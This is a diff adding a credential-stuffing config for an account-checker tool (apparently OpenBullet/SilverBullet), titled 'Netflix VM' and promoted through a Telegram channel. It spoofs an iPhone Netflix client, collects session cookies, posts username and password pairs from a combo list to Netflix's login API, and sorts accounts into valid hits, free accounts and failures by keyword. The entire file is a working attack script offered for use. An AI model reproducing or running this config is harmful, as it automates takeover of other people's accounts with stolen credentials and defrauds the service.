@@ -1,0 +1,116 @@
+[SETTINGS]
+{
+  "Name": "Netflix VM by @Magic_Ckg",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2023-02-25T20:33:44.1366967+02:00",
+  "AdditionalInfo": "https://t.me/Config_list_1",
+  "RequiredPlugins": [],
+  "Author": "@Magic_Ckg",
+  "Version": "1.1.2 [SB]",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "IsBase64": false,
+  "FilterList": [],
+  "EvaluateMathOCR": false,
+  "SecurityProtocol": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "AcceptInsecureCertificates": true,
+  "DisableNotifications": false,
+  "DisableImageLoading": false,
+  "DefaultProfileDirectory": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": "",
+  "Title": "Netflix VM by @Magic_Ckg",
+  "IconPath": "Icon\\svbfile.ico",
+  "LicenseSource": null,
+  "Message": null,
+  "MessageColor": "#FFFFFFFF",
+  "HitInfoFormat": "[{hit.Type}][{hit.Proxy}] {hit.Data} - [{hit.CapturedString}]",
+  "AuthorColor": "#FFFFB266",
+  "WordlistColor": "#FFB5C2E1",
+  "BotsColor": "#FFA8FFFF",
+  "CustomInputColor": "#FFD6C7C7",
+  "CPMColor": "#FFFFFFFF",
+  "ProgressColor": "#FFAD93E3",
+  "HitsColor": "#FF66FF66",
+  "CustomColor": "#FFFFB266",
+  "ToCheckColor": "#FF7FFFD4",
+  "FailsColor": "#FFFF3333",
+  "RetriesColor": "#FFFFFF99",
+  "OcrRateColor": "#FF4698FD",
+  "ProxiesColor": "#FFFFFFFF"
+}
+
+[SCRIPT]
+!FUNCTION RandomString "?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m" -> VAR "num" 
+
+!FUNCTION URLEncode "NFAPPL-02-IPHONE9=3-<num>" -> VAR "brand" 
+
+!#USER FUNCTION URLEncode "<USER>" -> VAR "US" 
+
+!#PASS FUNCTION URLEncode "<PASS>" -> VAR "PS" 
+
+!#cookie REQUEST GET "https://ios.prod.ftl.netflix.com/iosui/user/14.33?appInternalVersion=14.33.0&appVersion=14.33.0&device_type=NFAPPL-02-&esn=NFAPPL-02-IPHONE9%3<brand>&idiom=phone&iosVersion=15.0&isTablet=false&kids=true&maxDeviceWidth=375&model=saget&modelType=%C4%B0PHONE9-3&odpAware=true&path=%5B%22messaging%22%2C%22alerts%22%5D&path=%5B%22messaging%22%2C%22surveys%22%5D&path=%5B%22customerSupportVoipAuthorizations%22%5D&path=%5B%22geolocation%22%5D&path=%5B%22languages%22%5D&path=%5B%22config%22%5D&path=%5B%22nrmstart%22%5D&pathFormat=graph&pixelDensity=2.0&progressive=false&responseFormat=json" 
+!  
+
+!#nfvdid PARSE "<COOKIES(nfvdid)>" LR "" "" -> VAR "nfvdid" 
+
+!#memclid PARSE "<COOKIES(memclid)>" LR "" "" -> VAR "memclid" 
+
+!REQUEST GET "https://www.netflix.com/au/login" 
+!  
+
+!#flwssn PARSE "<COOKIES(flwssn)>" LR "" "" -> VAR "flwssn" 
+
+#login REQUEST POST "https://api-global.netflix.com/iosui/user/12.7" 
+  CONTENT "appInternalVersion=12.7.0&appVersion=12.7.0&callPath=[\"moneyball\",\"appleSignUp\",\"next\"]&config={\"useSecureImages\":true,\"billboardTrailerEnabled\":\"false\",\"clipsEnabled\":\"false\",\"titleCapabilityFlattenedShowEnabled\":\"true\",\"previewsBrandingEnabled\":\"true\",\"seasonRenewalPostPlayEnabled\":\"true\",\"aroGalleriesEnabled\":\"true\",\"interactiveFeatureSugarPuffsEnabled\":\"true\",\"showMoreDirectors\":true,\"billboardEnabled\":\"true\",\"interactiveFeaturePIBEnabled\":\"true\",\"warmerHasGenres\":true,\"interactiveFeatureBadgeIconTestEnabled\":\"9.57.0\",\"previewsRowEnabled\":\"true\",\"kidsMyListEnabled\":\"true\",\"billboardPredictionEnabled\":\"false\",\"kidsBillboardEnabled\":\"true\",\"characterBarOnPhoneEnabled\":\"false\",\"contentWarningEnabled\":\"true\",\"postplayProductizationEnabled\":\"false\",\"bigRowEnabled\":\"true\",\"interactiveFeatureAppUpdateDialogueEnabled\":\"false\",\"familiarityUIEnabled\":\"false\",\"bigrowNewUIEnabled\":\"false\",\"isAccountProfileLinkEnabled\":false,\"interactiveFeatureSugarPuffsPreplayEnabled\":\"true\",\"previewsInBillboardEnabled\":\"false\",\"interactiveFeatureTemplatesEnabled\":\"true\",\"motionCharacterEnabled\":\"true\",\"billboardKidsTrailerEnabled\":\"false\",\"roarEnabled\":\"true\",\"topTenListEnabled\":\"false\",\"mobileCollectionsEnabled\":\"false\",\"isCreatorHomeForRMEnabled\":\"true\",\"interactiveFeatureMinecraftEnabled\":\"true\",\"kidsParityLolomoDefaultsEnabled\":\"false\",\"titleGroupsRowPatchedEnabled\":\"false\",\"interactiveFeatureKimmyEnabled\":\"true\",\"interactiveFeatureYouVsWildEnabled\":\"true\",\"mobileCollectionsTitleGroupsEnabled\":\"false\",\"kidsTrailers\":true}&device_type=NFAPPL-02-&esn=<brand>&idiom=phone&iosVersion=14.2&isTablet=false&kids=false&languages=en-MU&locale=MU&maxDeviceWidth=375&method=call&model=saget&modelType=IPHONE9-1&odpAware=true&param={\"action\":\"loginAction\",\"fields\":{\"userLoginId\":\"<USER>\",\"rememberMe\":\"true\",\"password\":\"<PASS>\"},\"verb\":\"POST\",\"mode\":\"login\",\"flow\":\"appleSignUp\"}&pathFormat=graph&pixelDensity=2.0&progressive=false&responseFormat=json" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Argo/12.7.0 (iPhone; iOS 14.2; Scale/2.00)" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Host: api-global.netflix.com" 
+  HEADER "X-Netflix.Argo.abTests: " 
+  HEADER "X-Netflix.client.appVersion: 12.7.0" 
+  HEADER "X-Netflix.Argo.NFNSM: 9" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "X-Netflix.Request.Attempt: 1" 
+  HEADER "X-Netflix.client.idiom: phone" 
+  HEADER "X-Netflix.client.type: argo" 
+  HEADER "Content-Length: 2636" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Cookie: memclid=<memclid>; nfvdid=<nfvdid>; flwssn=<flwssn>" 
+  HEADER "X-Netflix.client.iosVersion: 14.2" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "\"mode\":\"memberHome\"" 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "never_member_consumption_only" 
+    KEY "NEVER_MEMBER" 
+    KEY "button_finishsignup_capitalized" 
+    KEY "flow\":\"signupSimplicity" 
+    KEY "\"mode\":\"welcome\"" 
+  KEYCHAIN Failure OR 
+    KEY "unrecognized_email" 
+
